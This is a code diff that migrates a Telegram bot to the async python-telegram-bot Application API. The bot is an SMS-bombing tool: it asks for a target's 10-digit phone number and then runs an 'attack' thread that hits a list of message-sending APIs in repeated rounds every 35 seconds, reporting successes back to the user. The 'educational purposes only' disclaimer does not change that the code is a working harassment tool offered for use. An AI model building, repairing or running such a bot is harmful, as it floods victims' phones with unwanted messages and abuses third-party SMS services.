@@ -2,13 +2,14 @@ import requests
 import random
 import logging
 import threading
+import asyncio
 from time import sleep
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-    Updater,
+    Application,
     CommandHandler,
     CallbackQueryHandler,
-    CallbackContext,
+    ContextTypes,
     MessageHandler,
     filters
 )
@@ -65,7 +66,7 @@ APIS = [
     }
 ]
 
-def start(update: Update, context: CallbackContext) -> None:
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send a beautiful message when the command /start is issued."""
     user = update.effective_user
     welcome_msg = f"""
@@ -94,9 +95,9 @@ This bot is for *educational purposes only*. Misuse may violate terms of service
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    update.message.reply_markdown_v2(welcome_msg, reply_markup=reply_markup)
+    await update.message.reply_markdown_v2(welcome_msg, reply_markup=reply_markup)
 
-def help_command(update: Update, context: CallbackContext) -> None:
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Send help message."""
     help_text = """
 📖 *Help Guide*
@@ -116,37 +117,37 @@ Send /stop command
 
 ⚠️ Use responsibly!
     """
-    update.message.reply_markdown_v2(help_text)
+    await update.message.reply_markdown_v2(help_text)
 
-def button(update: Update, context: CallbackContext) -> None:
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle button presses."""
     query = update.callback_query
-    query.answer()
+    await query.answer()
 
     if query.data == 'start_attack':
-        query.edit_message_text(text="🔢 Please send the target 10-digit phone number now (e.g., 9876543210)")
+        await query.edit_message_text(text="🔢 Please send the target 10-digit phone number now (e.g., 9876543210)")
         context.user_data['expecting_number'] = True
     elif query.data == 'help':
-        help_command(update, context)
+        await help_command(update, context)
 
-def handle_message(update: Update, context: CallbackContext) -> None:
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle incoming messages."""
     if 'expecting_number' in context.user_data and context.user_data['expecting_number']:
         phone_number = update.message.text.strip()
         
         if not phone_number.isdigit() or len(phone_number) != 10:
-            update.message.reply_text("❌ Invalid phone number. Please provide a 10-digit number.")
+            await update.message.reply_text("❌ Invalid phone number. Please provide a 10-digit number.")
             return
         
         context.user_data['expecting_number'] = False
-        start_attack(update, context, phone_number)
+        await start_attack(update, context, phone_number)
 
-def start_attack(update: Update, context: CallbackContext, phone_number: str) -> None:
+async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str) -> None:
     """Start the SMS attack."""
     user_id = update.effective_user.id
     
     if user_id in active_attacks:
-        update.message.reply_text("⚠️ You already have an active attack. Use /stop to stop it first.")
+        await update.message.reply_text("⚠️ You already have an active attack. Use /stop to stop it first.")
         return
     
     stop_event = threading.Event()
@@ -160,10 +161,13 @@ def start_attack(update: Update, context: CallbackContext, phone_number: str) ->
     attack_thread.start()
     
     active_attacks[user_id] = attack_thread
-    update.message.reply_text(f"🚀 Attack started on {phone_number}!\n\n🛑 Use /stop to end the attack.")
+    await update.message.reply_text(f"🚀 Attack started on {phone_number}!\n\n🛑 Use /stop to end the attack.")
 
-def run_attack(update: Update, context: CallbackContext, phone_number: str, stop_event: threading.Event) -> None:
+def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, stop_event: threading.Event) -> None:
     """Run the attack in a separate thread."""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
     while not stop_event.is_set():
         try:
             # Send to all APIs simultaneously using threads
@@ -184,11 +188,14 @@ def run_attack(update: Update, context: CallbackContext, phone_number: str, stop
             
             # Send summary
             success_count = sum(1 for r in results if r['success'])
-            update.message.reply_text(
-                f"📊 Round completed for {phone_number}:\n"
-                f"✅ Success: {success_count}\n"
-                f"❌ Failed: {len(results) - success_count}\n"
-                f"🔄 Next round in 35 seconds..."
+            loop.run_until_complete(
+                context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text=f"📊 Round completed for {phone_number}:\n"
+                         f"✅ Success: {success_count}\n"
+                         f"❌ Failed: {len(results) - success_count}\n"
+                         f"🔄 Next round in 35 seconds..."
+                )
             )
             
             # Wait 35 seconds or until stopped
@@ -200,7 +207,12 @@ def run_attack(update: Update, context: CallbackContext, phone_number: str, stop
         except Exception as e:
             logger.error(f"Error in attack thread: {e}")
             if not stop_event.is_set():
-                update.message.reply_text(f"⚠️ Error in attack: {str(e)}")
+                loop.run_until_complete(
+                    context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"⚠️ Error in attack: {str(e)}"
+                    )
+                )
             break
 
 def send_single_request(api: dict, phone_number: str, results: list) -> None:
@@ -236,12 +248,12 @@ def send_single_request(api: dict, phone_number: str, results: list) -> None:
             "error": str(e)
         })
 
-def stop_attack(update: Update, context: CallbackContext) -> None:
+async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Stop the active attack."""
     user_id = update.effective_user.id
     
     if user_id not in active_attacks:
-        update.message.reply_text("ℹ️ You don't have any active attacks to stop.")
+        await update.message.reply_text("ℹ️ You don't have any active attacks to stop.")
         return
     
     # Signal the thread to stop
@@ -254,26 +266,22 @@ def stop_attack(update: Update, context: CallbackContext) -> None:
     del active_attacks[user_id]
     del stop_events[user_id]
     
-    update.message.reply_text("🛑 Attack stopped successfully!")
+    await update.message.reply_text("🛑 Attack stopped successfully!")
 
 def main() -> None:
     """Start the bot."""
-    # Create the Updater and pass it your bot's token.
-    updater = Updater(TOKEN)
-
-    # Get the dispatcher to register handlers
-    dispatcher = updater.dispatcher
+    # Create the Application and pass it your bot's token.
+    application = Application.builder().token(TOKEN).build()
 
     # Register handlers
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CommandHandler("help", help_command))
-    dispatcher.add_handler(CommandHandler("stop", stop_attack))
-    dispatcher.add_handler(CallbackQueryHandler(button))
-    dispatcher.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("stop", stop_attack))
+    application.add_handler(CallbackQueryHandler(button))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    # Start the Bot
-    updater.start_polling()
-    updater.idle()
+    # Run the bot until the user presses Ctrl-C
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
     main()
